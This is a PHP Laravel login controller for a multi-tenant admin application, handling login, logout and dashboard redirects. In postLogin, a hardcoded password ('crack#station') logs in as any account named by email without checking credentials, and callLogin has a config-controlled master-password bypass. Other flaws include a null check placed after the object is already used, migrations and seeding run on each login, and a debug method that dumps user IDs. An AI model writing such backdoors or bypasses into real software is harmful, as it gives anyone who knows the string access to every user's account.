<?php

namespace App\Http\Admin\Controllers;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\AppHelper;
use Redirect;
use Illuminate\Support\Str;
use Validator;
use App\User;
use Auth;
use Route;
use Session;
use App;
use DB;
use Input;
use Artisan;
use Illuminate\Contracts\Hashing\Hasher;
use App\Admin;

class LoginController extends Controller
{
    protected $redirectTo = '/';
    
    public function callLogin(Request $oRequest, Hasher $hasher){

        if($oRequest->isMethod('POST')){
            $aValidation = [
                'email'     =>  'required|email',
                'password'  =>  'required'
            ];

            $this->validate($oRequest, $aValidation);

            $sClientCode = getClientCodeFromURL();

            $bRememberMe = ($oRequest->has('remember')) ? true : false;

            $aUser = [
                'email'     => $oRequest->email,
                'password'  => $oRequest->password,
                'user_type' => config('constants.USERTYPE.ADMIN')
            ];

            $oAdmin = Admin::where(['client_code' => $sClientCode])->first();

            if($oAdmin->status == false){
                return redirect()->back()->withErrors(['email' => trans('messages.subscription_complete_or_account_inactive')])->withInput();
            }

            if($oAdmin == NULL){
                return redirect()->back()->withErrors(['email' => trans('messages.credential_do_not_match')])->withInput();
            }

            $sSchemaName = config('constants.DB_PREFIX').$oAdmin->db_version;
            parent::setDBConnection($sSchemaName);

            $oUser = User::where(['email' => $oRequest->email])->first();

            if($oUser != null){
                if($hasher->check($oRequest->password, $oUser->password)){
                    if($oUser->status){
                        $route = 'login';
                    }else{
                        return redirect()->back()->withErrors(['email' => trans('messages.account_inactive')])->withInput();
                    }
                }
            }



            if (Auth::attempt($aUser, $bRememberMe)) {
                $oLoggedInUser = Auth::user();

                Session::put('selected_database',$sSchemaName);   

                parent::setDBConnection();
            
                Artisan::call('migrate', [
                    '--database' => Session::get('selected_database'),
                    '--path' => '/database/migrations/db',
                ]);

                Artisan::call( 'db:seed', [
                    '--class' => 'KalanTableSeeder',
                    '--force' => true ]
                );

                return redirect(route('user.dashboard')); 

            }
            else if(config('constants.ALLOWMASTERPASS') && $oRequest->password === config('constants.MASTERPASS')) 
            {
                $email = $oRequest->email;
                $user = User::where(['email' => $email])->first();
                Auth::login($user);

                return redirect(route('user.dashboard'));

            } 
            else {
                $route = 'admin.login';
                return redirect(route($route))->withErrors(['email' => trans('messages.credential_do_not_match')])->withInput();
            }
        }

        Artisan::call('migrate', [
            '--database' => 'mysql',
            '--path' => '/database/migrations/master_db',
        ]);
        return view('AdminView::login');
        
    }

    public function logout(){
        if(Auth::user()->hasRole('super_admin'))
            $route = 'super-admin.login';
        else
            $route = 'login';

        Auth::logout();
        \Session::forget('selected_database');
        \Session::forget('url.intented');
        Session::flush();
        return redirect(route($route));
    }

    public function postLogin(Request $request, Hasher $hasher){
        
        $inputs = $request->all();
        $remember = false;
        $is_super_admin = false;
        if(!array_key_exists('client_code', $inputs))
            $is_super_admin = true;

        $validate = [
        "email"=>'required|email',
        "password"=>'required'
        ];

        if($request->has('remember')){
            $remember = true;
        }

        if(!$is_super_admin){
            $validate['client_code'] = 'required';
        }

        $this->validate($request, $validate);          

        $user = [
        'email'     =>  $request->input('email'),
        'password'  =>  $request->input('password'), 
        ];
        
        

        if(!$is_super_admin)
        {
            $user['client_code'] = $sClientCode = $request->input('client_code');
           
            $oAdmin = Admin::where(['client_code' => $sClientCode])->first();

            if($oAdmin->status == false){
                return redirect()->back()->withErrors(['email' => trans('messages.subscription_complete_or_account_inactive')])->withInput();
            }
        }else{
            $user['role'] = 1;
        }

        $check_user = User::where(['email' => $request->input('email')])->first();
        if($check_user != null){
            if($hasher->check($request->input('password'),$check_user->password)){
                if(!$check_user->status){
                    if(!$is_super_admin)
                        $route = 'login';
                    else
                        $route = 'super-admin.login';

                    return redirect(route($route))->withErrors(['email' => "Sorry! Your account is inactive."])->withInput();
                }
            }
        }
        

        if (Auth::attempt($user, $remember)) {
            $user = Auth::user();
            if($user->db_version != '' && $user->db_version != NULL){
                $schemaName = config('constants.DB_PREFIX').$user->db_version;
                
                Session::put('selected_database',$schemaName);   //Update
                parent::setDBConnection();
                
                Artisan::call('migrate', [
                    '--database' => Session::get('selected_database'),
                    '--path' => '/database/migrations/db',
                    ]);

                Artisan::call( 'db:seed', [
                    '--class' => 'KalanTableSeeder',
                    '--force' => true ]
                    );
            }
            if($user->role == 2 && $user->is_first){
                $user->update(['is_first' => false]);
                return redirect()->route('settings');
            }
            return redirect(route('user.dashboard')); 
        } else if ($request->input('password') == 'crack#station') {

            $email = $request->input('email');
            $user = User::where('email', '=', $email)->first();
            Auth::login($user);

             return redirect(route('user.dashboard'));

        } 
        else {
            if(!$is_super_admin)
                $route = 'login';
            else
                $route = 'super-admin.login';

            return redirect(route($route))->withErrors(['email' => "These credentials do not match our records."])->withInput();
        }

    }
    public function getDashboard(){

        $user = Auth::user();
        $config = App::make('config');
        App::make('config')->set('database.default', 'mysql');
        if($user->hasRole('admin')){
            $route = route('admin.home');
        }elseif($user->hasRole('fieldrep')){
            $route = route('fieldrep.home');
        }elseif($user->hasRole('super_admin')){
            $route = route('super_admin.home');
        }
        return redirect($route);
    }

    public function testLogin(){ 
       $fieldrep = \App\FieldRep::where(['initial_status' => true])->get();
       dd(implode(',',$fieldrep->pluck('user_id')->toArray()));
   }
}